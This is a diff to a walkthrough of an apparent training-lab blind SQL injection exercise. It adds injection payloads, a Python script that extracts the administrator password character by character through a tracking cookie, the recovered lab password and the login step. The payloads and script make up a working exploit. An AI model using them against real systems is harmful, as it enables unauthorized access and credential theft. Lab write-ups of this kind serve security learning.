@@ -4,11 +4,18 @@
 >
 
 ## Step 1 : Check vul sql blind
-![check1]()
+```sql
+' or 1=1-- -
+
+' || (select '' from dual) || '  =>Oke        => Oracle database 
+
+1' union select '1' from users where username='administrator'-- -
+```
+![check1](https://github.com/tinasahara1/Vulnerable-CTF-/blob/7233da29d2d1d91889c23b1923f53f068c14163c/SQL/MySQL/image/check1.PNG)
 
 
 ## Step 2 : Check length password 
-![check1]()
+![check1](https://github.com/tinasahara1/Vulnerable-CTF-/blob/7233da29d2d1d91889c23b1923f53f068c14163c/SQL/MySQL/image/check2.PNG)
 
 => Length of administrator password : 20 
 
@@ -30,10 +37,49 @@ for c in chars:
 ```
 
 `2. Use burp suite intruder `
-![check]()
 
-=> The first letter is '6'
+![check](https://github.com/tinasahara1/Vulnerable-CTF-/blob/7233da29d2d1d91889c23b1923f53f068c14163c/SQL/MySQL/image/check_3.png)
 
-## Step 4 : Code py 
+=> The first letter is 't'
+
+## Step 4 : Code py to find full letter of password
+```py
+import string
+import requests
+
+url='https://acfb1fcd1f5d9cb4c0067543004e007f.web-security-academy.net/'
+chars = string.printable[:-6]
+#print(chars)
+admin_pass=''
+i=1
+s=requests.Session()
+s.get(url)
+
+while True:
+	for c in chars:
+		payload = f"1' union select '1' from users where username='administrator' and substring(password,{i},1)='{c}'-- -"
+		cookie1={"TrackingId":payload}
+		r = requests.get(url,cookies=cookie1)
+		print(c)
+		if 'Welcome' in r.text :
+			print('okeeeeeeeeeee')
+			admin_pass+=c 
+			i+=1
+			print(admin_pass)
+			break
+		if(i==21):
+			exit()
+
+```
+
+![check4](https://github.com/tinasahara1/Vulnerable-CTF-/blob/7233da29d2d1d91889c23b1923f53f068c14163c/SQL/MySQL/image/check4.PNG)
+
+=> Pass : `tdbnwdqkghsguyxqkywa`
+
+## Step 5 : login user : `administrator` with password : `tdbnwdqkghsguyxqkywa`
+![ok](https://github.com/tinasahara1/Vulnerable-CTF-/blob/7233da29d2d1d91889c23b1923f53f068c14163c/SQL/MySQL/image/oke.PNG)
+
+
+
 
 
